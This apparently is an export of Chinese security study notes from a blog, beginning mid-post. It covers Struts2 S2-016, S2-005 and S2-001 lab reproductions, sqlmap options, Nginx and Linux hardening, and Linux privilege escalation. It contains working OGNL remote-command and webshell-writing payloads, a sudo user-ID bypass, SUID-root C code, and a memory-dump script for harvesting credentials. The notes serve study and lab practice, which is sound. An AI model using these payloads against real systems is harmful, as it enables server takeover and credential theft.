65%74%52%75%6e%74%69%6d%65%28%29%2e%65%78%65%63%28%27%69%64%27%29%2e%67%65%74%49%6e%70%75%74%53%74%72%65%61%6d%28%29%29%2c%23%71%7d%2e%61%63%74%69%6f%6e 执行ls，查看文件 1$&#123;#context[‘xwork.MethodAccessor.denyMethodExecution’]=false,#m=#_memberAccess.getClass().getDeclaredField(‘allowStaticMethodAccess’),#m.setAccessible(true),#m.set(#_memberAccess,true),#q=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(‘ls’).getInputStream()),#q&#125;.action 执行失败，需要转url编码（可以使用火狐自带hackbar） 1/%24%7B%23context%5B%27xwork.MethodAccessor.denyMethodExecution%27%5D%3Dfalse%2C%23m%3D%23_memberAccess.getClass%28%29.getDeclaredField%28%27allowStaticMethodAccess%27%29%2C%23m.setAccessible%28true%29%2C%23m.set%28%23_memberAccess%2Ctrue%29%2C%23q%3D@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.exec%28%27ls%27%29.getInputStream%28%29%29%2C%23q%7D.action S2-016 复现影响版本: 2.0.0 - 2.3.15 原理在struts2中，DefaultActionMapper类支持以”action:”、”redirect:”、”redirectAction:”作为导航或是重定向前缀，但是这些前缀后面同时可以跟OGNL表达式，由于struts2没有对这些前缀做过滤，导致利用OGNL表达式调用java静态方法执行任意系统命令。 所以，访问http://your-ip:8080/index.action?redirect:OGNL表达式即可执行OGNL表达式。 poc执行命令，通过火狐将表达式转url编码 1redirect:$&#123;#context[&quot;xwork.MethodAccessor.denyMethodExecution&quot;]=false,#f=#_memberAccess.getClass().getDeclaredField(&quot;allowStaticMethodAccess&quot;),#f.setAccessible(true),#f.set(#_memberAccess,true),#a=@java.lang.Runtime@getRuntime().exec(&quot;uname -a&quot;).getInputStream(),#b=new java.io.InputStreamReader(#a),#c=new java.io.BufferedReader(#b),#d=new char[5000],#c.read(#d),#genxor=#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;).getWriter(),#genxor.println(#d),#genxor.flush(),#genxor.close()&#125; 获取web目录： 1redirect:$&#123;#req=#context.get(&#x27;co&#x27;+&#x27;m.open&#x27;+&#x27;symphony.xwo&#x27;+&#x27;rk2.disp&#x27;+&#x27;atcher.HttpSer&#x27;+&#x27;vletReq&#x27;+&#x27;uest&#x27;),#resp=#context.get(&#x27;co&#x27;+&#x27;m.open&#x27;+&#x27;symphony.xwo&#x27;+&#x27;rk2.disp&#x27;+&#x27;atcher.HttpSer&#x27;+&#x27;vletRes&#x27;+&#x27;ponse&#x27;),#resp.setCharacterEncoding(&#x27;UTF-8&#x27;),#ot=#resp.getWriter (),#ot.print(&#x27;web&#x27;),#ot.print(&#x27;path:&#x27;),#ot.print(#req.getSession().getServletContext().getRealPath(&#x27;/&#x27;)),#ot.flush(),#ot.close()&#125; 写入webshell： 1redirect:$&#123;#context[&quot;xwork.MethodAccessor.denyMethodExecution&quot;]=false,#f=#_memberAccess.getClass().getDeclaredField(&quot;allowStaticMethodAccess&quot;),#f.setAccessible(true),#f.set(#_memberAccess,true),#a=#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletRequest&quot;),#b=new java.io.FileOutputStream(new java.lang.StringBuilder(#a.getRealPath(&quot;/&quot;)).append(@java.io.File@separator).append(&quot;1.jspx&quot;).toString()),#b.write(#a.getParameter(&quot;t&quot;).getBytes()),#b.close(),#genxor=#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;).getWriter(),#genxor.println(&quot;BINGO&quot;),#genxor.flush(),#genxor.close()&#125;","categories":[],"tags":[]},{"title":"","slug":"Struts2漏洞S2-005复现","date":"2024-02-26T02:25:19.070Z","updated":"2022-04-08T17:19:05.417Z","comments":true,"path":"2024/02/26/Struts2漏洞S2-005复现/","permalink":"http://example.com/2024/02/26/Struts2%E6%BC%8F%E6%B4%9ES2-005%E5%A4%8D%E7%8E%B0/","excerpt":"","text":"123456789title: 漏洞复现学习（s2-005）tags: - 渗透测试 - 漏洞复现 - struts2categories: - 渗透测试 - 漏洞复现 - struts2 Struts2漏洞S2-005复现笔记S2-005复现漏洞原理1s2-005漏洞的起源源于S2-003(受影响版本: 低于Struts 2.0.12)，struts2会将http的每个参数名解析为OGNL语句执行(可理解为java代码)。OGNL表达式通过#来访问struts的对象，struts框架通过过滤#字符防止安全问题，然而通过unicode编码(\\u0023)或8进制(\\43)即绕过了安全限制，对于S2-003漏洞，官方通过增加安全配置(禁止静态方法调用和类方法执行等)来修补，但是安全配置被绕过再次导致了漏洞，攻击者可以利用OGNL表达式将这2个选项打开 影响版本：Struts 2.0.0-2.1.8.1 漏洞搭建1https://github.com/vulhub/vulhub/tree/master/struts2/s2-005 运行以下命令启动环境 12docker-compose builddocker-compose up -d 搭建成功： 构建poc使用抓包工具burp suite，修改数据包插入poc 1(%27%5cu0023_memberAccess[%5c%27allowStaticMethodAccess%5c%27]%27)(vaaa)=true&amp;(aaaa)((%27%5cu0023context[%5c%27xwork.MethodAccessor.denyMethodExecution%5c%27]%5cu003d%5cu0023vccc%27)(%5cu0023vccc%5cu003dnew%20java.lang.Boolean(%22false%22)))&amp;(asdf)((&#x27;%5cu0023rt.exec(%22touch@/tmp/success%22.split(%22@%22))&#x27;)(%5cu0023rt%5cu003d@java.lang.Runtime@getRuntime()))=1 Poc2： 1?%27%2B%28%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23context%5B%22xwork.MethodAccessor.denyMethodExecution%22%5D%3Dfalse%2C%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%27id%27%29.getInputStream%28%29%29%29%2B%27 查看数据连接状态命令： 1docker exec -it c25543ef6c4c /bin/bash ls &#x2F;tmp","categories":[],"tags":[]},{"title":"","slug":"Struts2漏洞S2-001复现","date":"2024-02-26T02:25:19.069Z","updated":"2022-04-08T17:20:08.720Z","comments":true,"path":"2024/02/26/Struts2漏洞S2-001复现/","permalink":"http://example.com/2024/02/26/Struts2%E6%BC%8F%E6%B4%9ES2-001%E5%A4%8D%E7%8E%B0/","excerpt":"","text":"123456789title: 漏洞复现学习（s2-001）tags: - 渗透测试 - 漏洞复现 - struts2categories: - 渗透测试 - 漏洞复现 - struts2 Struts2 漏洞S2-001复现学习笔记S2-001复现原理：该漏洞因用户提交表单数据并且验证失败时，后端会将用户之前提交的参数值使用OGNL表达式%{value}进行解析，然后重新填充到对应的表单数据中。如注册或登录页面，提交失败后一般会默认返回之前提交的数据，由于后端使用%{value}对提交的数据执行了一次OGNL 表达式解析，所以可以直接构造 Payload进行命令执行。 漏洞环境搭建https://github.com/vulhub/vulhub/tree/master/struts2/s2-001 运行以下命令进行设置 12docker-compose builddocker-compose up -d 访问 http://127.0.0.1:8080/ 漏洞poc测试1.输入**%{‘123’}**，sumbit 2.返回123，参数值，证明漏洞存在 构造poc 获取tomcat路径：1%&#123;&quot;tomcatBinDir&#123;&quot;+@java.lang.System@getProperty(&quot;user.dir&quot;)+&quot;&#125;&quot;&#125; 语句执行后，查看返回的语句信息： 获取网站真实路径：1%&#123;#req=@org.apache.struts2.ServletActionContext@getRequest(),#response=#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;).getWriter(),#response.println(#req.getRealPath(&#x27;/&#x27;)),#response.flush(),#response.close()&#125; 构造查看权限的poc：123456789101112131415161718192021%&#123;#a=(new java.lang.ProcessBuilder(new java.lang.String[]&#123;&quot;whoami&quot;&#125;)).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()&#125; 执行任意命令只需要将上面的poc中whoami替换：12345678910111213141516171819%&#123;#a=(new java.lang.ProcessBuilder(new java.lang.String[]&#123;&quot;cat&quot;,&quot;/etc/passwd&quot;&#125;)).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()&#125; 执行命令（带参数的命令：new java.lang.String[]&#123;&quot;cat&quot;,&quot;/etc/passwd&quot;&#125;）：1%&#123;#a=(new java.lang.ProcessBuilder(new java.lang.String[]&#123;&quot;pwd&quot;&#125;)).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()&#125; 关闭docker环境1命令：docker-compose down -v","categories":[],"tags":[]},{"title":"","slug":"sqlmap学习笔记","date":"2024-02-26T02:25:19.067Z","updated":"2022-04-08T17:17:37.016Z","comments":true,"path":"2024/02/26/sqlmap学习笔记/","permalink":"http://example.com/2024/02/26/sqlmap%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/","excerpt":"","text":"123456789title: sqlmap学习笔记tags: - 渗透测试 - sqlmap - 漏洞分析categories: - 渗透测试 - 漏洞分析 - sqlmap Sqlmap学习笔记sqlmap介绍123456sqlmap 是一个由Python语言编写的开源渗透测试工具，它主要用来检测sql注入漏洞，是一款功能强大的sql漏洞检测利用工具。它可以检测的数据库有：access、mssql、mysql、oracle、postgresql、db2、sqlite等可以进行 sql盲注、union查询、显错注入、延迟注入、post注入、cookie注入等其他功能:执行命令、列举用户、检测权限、自动破解、数据导出等功能。 基本参数12345678910111213141516171819202122sqlmap.py -h 查看帮助is-dba 当前用户权限dbs 所有数据库current-db 网站当前数据库users 所有数据库用户current-user 当前数据库用户tables 参数:列表名columns 参数:列字段dump 参数:下载数据--dump 获取表中的数据，包含列 --dump-all 转存DBMS数据库所有表项目--level 测试等级(1-5)，默认为1读取数据库---&gt;读取表----&gt;读取表的列----&gt;获取内容-D 指定数据库-T 指定表-C 指定列--dbms=mysql oracle mssql 指定数据库--users 枚举所有用户--passwords 枚举所有用户密码--roles 列出数据库管理员角色--privileges 列出数据库管理员权限 列举数据库系统的架构 1sqlmap.py -u &quot;http://xx.com/int.php?id=1&quot; --schema --batch --exclude-sysdbs 探测等级12345参数：--level共有五个等级，默认为1，sqlmap使用的payload可以在xml/payloads.xml中看到，你也可以根据相应的格式添加自己的payload。这个参数不仅影响使用哪些payload同时也会影响测试的注入点，GET和POST的数据都会测试，HTTP Cookie在level为2的时候就会测试，HTTP User-Agent/Referer头在level为3的时候就会测试。总之在你不确定哪个payload或者参数为注入点的时候，为了保证全面性，建议使用高的level值。 显示调式信息123456789-v 显示调试信息 有7个级别0、只显示python错误以及严重的信息。1、同时显示基本信息和警告信息。（默认）2、同时显示debug信息。3、同时显示注入的payload。4、同时显示HTTP请求。5、同时显示HTTP响应头。6、同时显示HTTP响应页面。 风险等级123456789参数：--risk共有四个风险等级，默认是1会测试大部分的测试语句，2会增加基于事件的测试语句，3会增加OR语句的SQL注入测试。在有些时候，例如在UPDATE的语句中，注入一个OR的测试语句，可能导致更新的整个表，可能造成很大的风险。测试的语句同样可以在xml/payloads.xml中找到，你也可以自行添加payload。 获取目标123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136参数：-u或者--url格式：http(s)://targeturl[:port]/[…]例如：python sqlmap.py -u http://www.target.com/vuln.php?id=1从文本中获取多个目标扫描参数：-m文件中保存url格式如下，sqlmap会一个一个检测www.target1.com/vuln1.php?q=foobarwww.target2.com/vuln2.asp?id=1www.target3.com/vuln3/id/1*参数：-rsqlmap可以从一个文本文件中获取HTTP请求，这样就可以跳过设置一些其他参数（比如cookie，POST数据，等等）。比如文本文件内如下：POST /vuln.php HTTP/1.1Host: www.target.comUser-Agent: Mozilla/4.0id=1参数：-gsqlmap可以测试注入Google的搜索结果中的GET参数（只获取前100个结果）。例子：python sqlmap.py -g &quot;inurl:php?id=&quot;--data此参数是把数据以POST方式提交，sqlmap会像检测GET参数一样检测POST的参数。例子：python sqlmap.py -u “http://www.cracer.com/cracer.php” --data=“id=1”--param-del参数拆分字符当GET或POST的数据需要用其他字符分割测试参数的时候需要用到此参数。例子：python sqlmap.py -u &quot;http://www.cracer.com/vuln.php&quot; --data=&quot;query=foobar;d=1&quot; --param-del=&quot;;&quot; --cookie适用于cookie注入将参加加入cookie注入测试sqlmap -u &quot;http://www.ntjx.org/jsj/DownloadShow.asp&quot; --cookie &quot;id=9&quot; --table --level 2--referersqlmap可以在请求中伪造HTTP中的referer，当--level参数设定为3或者3以上的时候会尝试对referer注入。--headers可以通过--headers参数来增加额外的http头--hearders “client-ip: 1.1.1.1&#x27;”--proxy使用--proxy代理是格式为：http://url:port。--proxy=http://127.0.0.1:1080--proxy-file c:/1.txt--delay可以设定两个HTTP(S)请求间的延迟，设定为0.5的时候是半秒，默认是没有延迟的。--timeout可以设定一个HTTP(S)请求超过多久判定为超时，10.5表示10.5秒，默认是30秒。设定重试超时--retries当HTTP(S)超时时，可以设定重新尝试连接次数，默认是3次。设定随机改变的参数值--technique这个参数可以指定sqlmap使用的探测技术，默认情况下会测试所有的方式。支持的探测方式如下：B: Boolean-based blind SQL injection（布尔型注入）E: Error-based SQL injection（报错型注入）U: UNION query SQL injection（可联合查询注入）S: Stacked queries SQL injection（可多语句查询注入）T: Time-based blind SQL injection（基于时间延迟注入）默认情况下sqlmap测试UNION查询注入会测试1-10个字段数，当--level为5的时候他会增加测试到50个字段数。设定--union-cols的值应该是一段整数，如：12-16，是测试12-16个字段数。--union-char默认情况下sqlmap针对UNION查询的注入会使用NULL字符，但是有些情况下会造成页面返回失败，而一个随机整数是成功的，这是你可以用--union-char只定UNION查询的字符。二阶SQL注入有些时候注入点输入的数据看返回结果的时候并不是当前的页面，而是另外的一个页面，这时候就需要你指定到哪个页面获取响应判断真假。--second-order后门跟一个判断页面的URL地址.--dump-all参数获取所有数据库表的内容，可同时加上--exclude-sysdbs只获取用户数据库的表，需要注意在Microsoft SQL Server中master数据库没有考虑成为一个系统数据库，因为有的管理员会把他当初用户数据库一样来使用它。--search可以用来寻找特定的数据库名，所有数据库中的特定表名，所有数据库表中的特定字段。可以在一下三种情况下使用：-C后跟着用逗号分割的列名，将会在所有数据库表中搜索指定的列名。-T后跟着用逗号分割的表名，将会在所有数据库中搜索指定的表名-D后跟着用逗号分割的库名，将会在所有数据库中搜索指定的库名。你可以通过编译MySQL注入你自定义的函数（UDFs）或PostgreSQL在windows中共享库，DLL，或者Linux/Unix中共享对象，sqlmap将会问你一些问题，上传到服务器数据库自定义函数，然后根据你的选择执行他们，当你注入完成后，sqlmap将会移除它们。参数：-ssqlmap对每一个目标都会在output路径下自动生成一个SQLite文件，如果用户想指定读取的文件路径，就可以用这个参数。保存HTTP(S)日志参数：-t这个参数需要跟一个文本文件，sqlmap会把HTTP(S)请求与响应的日志保存到那里。--batch用此参数，不需要用户输入，将会使用sqlmap提示的默认值一直运行下去。强制使用字符编码--charset不使用sqlmap自动识别的（如HTTP头中的Content-Type）字符编码，强制指定字符编码如：--charset=GBK--flush-session如果不想用之前缓存这个目标的session文件，可以使用这个参数。 会清空之前的session，重新测试该目标。自动获取form表单测试--hex有时候字符编码的问题，可能导致数据丢失，可以使用hex函数来避免：例子：sqlmap.py -u &quot;http://192.168.48.130/sqlmap/pgsql/get_int.php?id=1&quot; --banner --hex -v 3 --parse-errors--output-dirsqlmap默认把session文件跟结果文件保存在output文件夹下，用此参数可自定义输出路径 例如：--output-dir=/tmp从响应中获取DBMS的错误信息参数：--parse-errors有时目标没有关闭DBMS的报错，当数据库语句错误时，会输出错误语句，用词参数可以会显出错误信息。--smart有时对目标非常多的URL进行测试，为节省时间，只对能够快速判断为注入的报错点进行注入，可以使用此参数。例子：$ python sqlmap.py -u &quot;http://192.168.21.128/sqlmap/mysql/get_int.php?ca=17&amp;user=foo&amp;id=1&quot; --batch --smart--mobile有时服务端只接收移动端的访问，此时可以设定一个手机的User-Agent来模仿手机登陆。例如：$ python sqlmap.py -u &quot;http://www.target.com/vuln.php?id=1&quot; --mobile--identify-wafsqlmap可以尝试找出WAF/IPS/IDS保护，方便用户做出绕过方式。目前大约支持30种产品的识别。--check-wafWAF/IPS/IDS保护可能会对sqlmap造成很大的困扰，如果怀疑目标有此防护的话，可以使用此参数来测试。 sqlmap将会使用一个不存在的参数来注入测试例如对一个受到ModSecurity WAF保护的MySQL例子：$ python sqlmap.py -u &quot;http://192.168.21.128/sqlmap/mysql/get_int.php?id=1&quot; --identify-waf -v 3 注册表12345678910111213当数据库为MySQL，PostgreSQL或Microsoft SQL Server，并且当前web应用支持堆查询。 当然，当前连接数据库的用户也需要有权限操作注册表。读取注册表值参数：--reg-read写入注册表值参数：--reg-add删除注册表值参数：--reg-del注册表辅助选项参数：--reg-key，--reg-value，--reg-data，--reg-type需要配合之前三个参数使用，例子：$ python sqlmap.py -u http://192.168.136.129/sqlmap/pgsql/get_int.aspx?id=1 --reg-add --reg-key=&quot;HKEY_LOCAL_MACHINE\\SOFTWARE\\sqlmap&quot; --reg-value=Test --reg-type=REG_SZ --reg-data=1 暴力破解表12345678910111213141516171819参数：--common-tables当使用--tables无法获取到数据库的表时，可以使用此参数。通常是如下情况：1、MySQL数据库版本小于5.0，没有information_schema表。2、数据库是Microssoft Access，系统表MSysObjects是不可读的（默认）。3、当前用户没有权限读取系统中保存数据结构的表的权限。暴力破解的表在txt/common-tables.txt文件中，你可以自己添加。Xx --common-tables -D testdb参数：--common-columns与暴力破解表名一样，暴力跑的列名在txt/common-columns.txt中。Xx --common-columns -T text -D testdb注入点：http://testasp.vulnweb.com/Login.asp几种注入方式：./sqlmap.py -r search-test.txt -p tfUPass sqlmap -u http://testasp.vulnweb.com/Login.asp --forms sqlmap -u http://testasp.vulnweb.com/Login.asp --data &quot;tfUName=1&amp;tfUPass=1&quot; 搜索框注入1sqlmap.py -r search-test.txt 伪静态注入12注入点：http://sfl.fzu.edu.cn/index.php/Index/view/id/40.htmlsqlmap -u http://sfl.fzu.edu.cn/index.php/Index/view/id/40*.html base64编码注入1sqlmap -u http://ha.cker.in/index.php?tel=LTEnIG9yICc4OCc9Jzg5 --tamper base64encode.py –dbs 请求时间延迟12参数：--time-sec当使用继续时间的盲注时，时刻使用--time-sec参数设定延时时间，默认是5秒 执行sql语句123456--sql-query=&quot;select @@version&quot;--sql-shellsqlmap会自动检测确定使用哪种SQL注入技术，如何插入检索语句。如果是SELECT查询语句，sqlap将会输出结果。如果是通过SQL注入执行其他语句，需要测试是否支持多语句执行SQL语句。 文件读写1234567从数据库服务器中读取文件参数：--file-read当数据库为MySQL，PostgreSQL或Microsoft SQL Server，并且当前用户有权限使用特定的函数。读取的文件可以是文本也可以是二进制文件。sqlmap.py -u &quot;http://192.168.2.3:81/about/show.php?lang=cn&amp;id=22&quot; --file-read=&quot;C:\\Inetpub\\wwwroot\\mysql-php\\1.php&quot; 文件上传12345参数：--file-write,--file-dest当数据库为MySQL，PostgreSQL或Microsoft SQL Server，并且当前用户有权限使用特定的函数。上传的文件可以是文本也可以是二进制文件。sqlmap.py -u &quot;http://192.168.2.129/article.php?id=5&quot; --file-write=&quot;C:\\1.php&quot; --file-dest=&quot;/var/www/html/x.php&quot; 命令执行123456789参数：--os-cmd,--os-shell当数据库为MySQL，PostgreSQL或Microsoft SQL Server，并且当前用户有权限使用特定的函数。在MySQL、PostgreSQL，sqlmap上传一个二进制库，包含用户自定义的函数，sys_exec()和sys_eval()。cmd 执行cmd命令（win）shell 执行当前用户命令 --os-shell自动上传 脚本文件返回shell waf1234注入点:http://192.168.159.1/news.php?id=1sqlmap -u http://192.168.159.1/news.php?id=1 -v 3 --dbs --batch --tamper &quot;space2morehash.py&quot;space2hash.py base64encode.py charencode.py","categories":[],"tags":[]},{"title":"Nginx学习","slug":"Nginx中间件的安全与加固","date":"2024-02-26T02:25:19.046Z","updated":"2022-04-08T17:36:06.418Z","comments":true,"path":"2024/02/26/Nginx中间件的安全与加固/","permalink":"http://example.com/2024/02/26/Nginx%E4%B8%AD%E9%97%B4%E4%BB%B6%E7%9A%84%E5%AE%89%E5%85%A8%E4%B8%8E%E5%8A%A0%E5%9B%BA/","excerpt":"","text":"Nginx1.常用功能1234 反向代理​ 负载均衡​ http服务器​ 正向代理 反向代理： 123以代理服务器来接受internet上的连接请求，然后将请求转发给内部网络上的服务器，并将服务器上得到的结果返回给Internet上的请求连接的客户端。 真实的服务器不能直接被外部网络访问，所以使用一台代理服务器。 负载均衡： 123分摊到多个操作单元上进行执行。例如web服务器，ftp服务器，企业关键应用， 多台服务器，根据随机规则将请求分发到指定服务器进行处理 一般需要配置反向代理，通过反向代理跳转到负载均衡。 负载均衡策略： 12345678910111.RR默认（Round-Robin） 轮询调度，按时间顺序逐一分配，若服务器down，能自动剔除。2.权重 轮询几率，weight和访问比率成正比，用于服务器性能不均的情况。3.ip_hash 以上的方式，可能造成下一个请求可能分配到其他服务器。（seission断开） 解决每个请求按照访问的ip的hash结果分配，确保每个访客固定访问一个后端服务器，解决session问题。4.fair（第三方） 按照服务器响应时间来分配，响应时间短的优先分配。5.url_hash(第三方) 按照url的hash的结果分配请求，按照url定向到同一个服务器，后端服务器为缓存时比较有效。 HTTP服务器： 1静态服务器，只有静态资源的时候，同时现在流行的动静分离，也可以用nginx实现。 正向代理：（客户端） 1客户端和原始服务器之间的，为了从原始服务器获得内容，客户端发送请求，代理服务器转交请求并返回内容。 2.Nginx安全检查和加固详解1.身份鉴别 12345a. 以低权限启动账户身份启动服务Unix&amp;Linux： ps -ef|grep nginx 查看进程账户是否为专用非root账号b. 弱口令 使用扫描器进行扫描，人工输入与用户名相同的密码 2.安全审计 12345a. 错误日志(日记级别：debug|info|notice|warn(建议级别)|error|crit|emerg) 编辑nginx.conf文件（eg:/usr/local/nginx/conf/nginx.conf）,去掉error_Log前面的“#”号b. 记录访问日志 应该设置access_log文件格式 配置日志功能，对访问进行记录 3.资源控制 123456789101是否限制ip访问 敏感目录的ip2客户端的请求读取时间 设置body，header读取时间 超时4083客户端保持活动的超时时间 keepalive4响应客户端超时时间sendtimeout5是否限制客户端下载的并发数6.客户端的下载速度7配置防盗链接设置 客户端请求的referer，ip 4.其他安全 1231检查是否自定义的错误信息2检查是否隐藏nginx版本信息","categories":[{"name":"Nginx","slug":"Nginx","permalink":"http://example.com/categories/Nginx/"}],"tags":[{"name":"Nginx","slug":"Nginx","permalink":"http://example.com/tags/Nginx/"}]},{"title":"","slug":"linux提取学习笔记","date":"2024-02-26T02:25:19.041Z","updated":"2022-04-08T14:29:40.265Z","comments":true,"path":"2024/02/26/linux提取学习笔记/","permalink":"http://example.com/2024/02/26/linux%E6%8F%90%E5%8F%96%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/","excerpt":"","text":"linux提权学习笔记操作系统信息123(cat /proc/version || uname -a ) 2&gt;/dev/nulllsb_release -a 2&gt;/dev/null # old, not by default on many systemscat /etc/os-release 2&gt;/dev/null # universal PATH 如果您对变量内的任何文件夹具有写入权限，您可能能够劫持一些库或二进制文件：**PATH** 1echo $PATH 环境信息 1(env || set) 2&gt;/dev/null 内核版本 123cat /proc/versionuname -asearchsploit &quot;Linux Kernel&quot; 编译的漏洞： 12345github.com/lucyoa/kernel-exploitsgithub.com/bwbwbwbw/linux-exploit-binariesgithub.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack 可以帮助搜索内核漏洞的工具 12https://github.com/mzet-/linux-exploit-suggesterhttps://github.com/jondonas/linux-exploit-suggester-2 CVE-2016-5195（脏牛）Linux 权限提升 - Linux 内核 &lt;&#x3D; 3.19.0-73.8 12345# make dirtycow stableecho 0 &gt; /proc/sys/vm/dirty_writeback_centisecsg++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutilhttps://github.com/dirtycow/dirtycow.github.io/wiki/PoCshttps://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c Sudo version123searchsploit sudosudo -V | grep &quot;Sudo ver&quot; | grep &quot;1\\.[01234567]\\.[0-9]\\+\\|1\\.8\\.1[0-9]\\*\\|1\\.8\\.2[01234567]&quot; 123456789101112sudo -V | grep &#x27;Sudo version&#x27; 查看是否受影响的版本，低于1.8.29有漏洞修改配置文件：vim/etc/sudoers 在root(ALL:ALL)ALL添加一行test ALL=(ALL,!root)ALLuseradd test passwd testsu - testsudo -u#-1 id -u 或sudo -u#4294967295 id -usudo -u#-1 whoamisudo -u#-1 sh 检查已安装和未安装的内容、位置 1234ls /dev 2&gt;/dev/null | grep -i &quot;sd&quot;cat /etc/fstab 2&gt;/dev/null | grep -v &quot;^#&quot; | grep -Pv &quot;\\W*\\#&quot; 2&gt;/dev/null#Check if credentials in fstabgrep -E &quot;(user|username|login|pass|password|pw|credentials)[=:]&quot; /etc/fstab /etc/mtab 2&gt;/dev/null 枚举有用的二进制文件 1which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2&gt;/dev/null 检查是否安装了任何编译器 1(dpkg --list 2&gt;/dev/null | grep &quot;compiler&quot; | grep -v &quot;decompiler\\|lib&quot; 2&gt;/dev/null || yum list installed &#x27;gcc*&#x27; 2&gt;/dev/null | grep gcc 2&gt;/dev/null; which gcc g++ 2&gt;/dev/null || locate -r &quot;/gcc[0-9\\.-]\\+$&quot; 2&gt;/dev/null | grep -v &quot;/doc/&quot;) 检查已安装包和服务的版本 12dpkg -l #Debianrpm -qa #Centos 可以使用openVAS检查机器内安装的过时和易受攻击的软件 查看正在执行的进程并检查是否有任何进程具有****比它应有的更多权限 123ps auxps -eftop -n 1 有权访问 FTP 服务的内存 123456gdb -p &lt;FTP_PROCESS_PID&gt;(gdb) info proc mappings 信息过程映射(gdb) q(gdb) dump memory /tmp/mem_ftp &lt;START_HEAD&gt; &lt;END_HEAD&gt;(gdb) qstrings /tmp/mem_ftp #用户和密码 gdb脚本 12345678#!/bin/bash#./dump-memory.sh &lt;PID&gt;grep rw-p /proc/$1/maps \\ | sed -n &#x27;s/^\\([0-9a-f]*\\)-\\([0-9a-f]*\\) .*$/\\1 \\2/p&#x27; \\ | while read start stop; do \\ gdb --batch --pid $1 -ex \\ &quot;dump memory $1-$start-$stop.dump 0x$start 0x$stop&quot;; \\done 内核溢出提权123456789查看内核uname -r反弹shell执行命令上传exp编译执行根据内核版本查找对应漏洞收集exp可以从www.exploit-db.com查找漏洞利用 linux-exploit-suggerster123https://github.com/mungurk/linux-exploit-suggester.sh/blob/master/linux-exploit-suggester.shchmod 777 x.sh./x.sh mysql UDF 提权12上传库文件执行库文件创建命令执行函数 利用SUID提权12寻找系统里可以用的SUID文件来提权$ find / -perm -u=s -type f 2&gt;/dev/null 利用环境变量劫持高权限程序提权1234第一步：查找可操作文件$ find / -perm -u=s -type f 2&gt;/dev/null第二步：利用file 命令查看文件是否可执行 •执行该文件 •在执行的时候可能会报错，根据报错来查看调用系统命令 利用chkrootkit &lt;0.49版本提权123456789101112131415161718191.如果发现Linux服务器存在chkrootkit并且版本小于0.492.上传一个利用脚本到/tmp目录下并编译#include &lt;unistd.h&gt;void main(void)&#123;system(&quot;chown root:root /tmp/update&quot;);system(&quot;chmod 4755 /tmp/update&quot;);setuid(0);setgid(0);execl(&quot;/bin/sh&quot;,&quot;sh&quot;,NULL);&#125;保存为update.c进入到/tmp目录下gcc -o update update.c然后等着管理员运行chkrootkit命令检测系统后门在发现/tmp/update 所有者会变成root这时候你在进入/tmp运行update./update 内网端口转发1234567内网主机输入命令lcx.exe -slave 外网ip 外网端口 内网ip 内网端口lcx.exe -slave 200.1.1.1 1111 192.168.1.2 3389外网主机输入命令lcx.exe -listen 1111 1311","categories":[],"tags":[]},{"title":"","slug":"linux安全管理","date":"2024-02-26T02:25:19.038Z","updated":"2022-04-08T14:29:40.265Z","comments":true,"path":"2024/02/26/linux安全管理/","permalink":"http://example.com/2024/02/26/linux%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86/","excerpt":"","text":"Linux安全管理 禁用不适用的用户 123456cat /etc/passwdcat /etc/group加固方式：username -L user 或 passwd -l user /锁定用户username -U user 或 passwd -u user /解锁用户 用户密码策略 1234567891.检查/etc/pam.d/system-auth/etc/pam.d/passwd/etc/pam.d/common-password是否进行了口令复杂度设置password requisite pam_cracklib.so ucredit=-1 lcredit=-1 dcredit=-1 ocredit=-12./etc/login.defs中是否进行了口令周期设置 cat /etc/login.defs | grep PASS 或change -l user 加固方式 使用ssh协议 service status ssh 禁止root用户远程登录 1234567cat /etc/ssh/sshd_config | grep PermitRootLoginvi /etc/ssh/sshd_config PermitRootLogin 设置为no禁止root用户远程telnet：编辑 /etc/pam.d/login,配置auth required pam_securetty.so 设置会话超时退出 1234cat /etc/profile |grep TMOUT加固root运行， vi /etc/profile ,增加export TMOUT=600(单位秒) 设置登录失败次数并锁定 日志记录 日志远程存储 减少history命令记录 